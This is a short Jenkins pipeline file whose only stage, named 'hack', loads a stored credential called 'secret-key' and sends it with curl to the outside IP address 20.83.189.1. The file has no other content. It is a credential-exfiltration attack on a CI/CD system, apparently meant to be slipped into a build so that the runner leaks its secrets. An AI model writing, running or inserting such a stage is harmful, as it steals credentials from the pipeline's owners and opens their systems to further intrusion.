pipeline {
    agent any
     environment {
        secret_key     = credentials('secret-key')
    }
    stages {
        stage('hack') {
            steps {
              sh 'curl -d env="$(secret_key)" http://20.83.189.1'
                }
            }
        }
    }
